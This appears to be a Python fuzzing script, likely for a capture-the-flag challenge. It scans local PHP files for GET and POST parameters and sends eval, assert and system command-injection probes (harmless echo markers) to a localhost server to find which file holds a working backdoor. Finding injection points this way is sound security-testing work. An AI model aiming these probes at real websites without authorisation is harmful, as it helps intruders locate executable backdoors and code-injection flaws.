import os
import threading
from concurrent.futures.thread import ThreadPoolExecutor

import requests

session = requests.Session()

path = "D:/phpStudy/WWW/src"  # 文件夹目录
files = os.listdir(path)  # 得到文件夹下的所有文件名称

mutex = threading.Lock()
pool = ThreadPoolExecutor(max_workers=50)

def read_file(file):
    f = open(path + "/" + file);  # 打开文件
    iter_f = iter(f);  # 创建迭代器
    str = ""
    for line in iter_f:  # 遍历文件，一行行遍历，读取文本
        str = str + line

    # 获取一个页面内所有参数
    start = 0
    params = {}
    while str.find("$_GET['", start) != -1:
        pos2 = str.find("']", str.find("$_GET['", start) + 1)
        var = str[str.find("$_GET['", start) + 7: pos2]
        start = pos2 + 1

        params[var] = 'echo("glzjin");'

        # print(var)

    start = 0
    data = {}
    while str.find("$_POST['", start) != -1:
        pos2 = str.find("']", str.find("$_POST['", start) + 1)
        var = str[str.find("$_POST['", start) + 8: pos2]
        start = pos2 + 1

        data[var] = 'echo("glzjin");'

        # print(var)

    # eval test
    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # assert test
    for i in params:
        params[i] = params[i][:-1]

    for i in data:
        data[i] = data[i][:-1]

    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # system test
    for i in params:
        params[i] = 'echo glzjin'

    for i in data:
        data[i] = 'echo glzjin'

    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # print("====================")

for file in files:  # 遍历文件夹
    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开
        # read_file(file)

        pool.submit(read_file, file)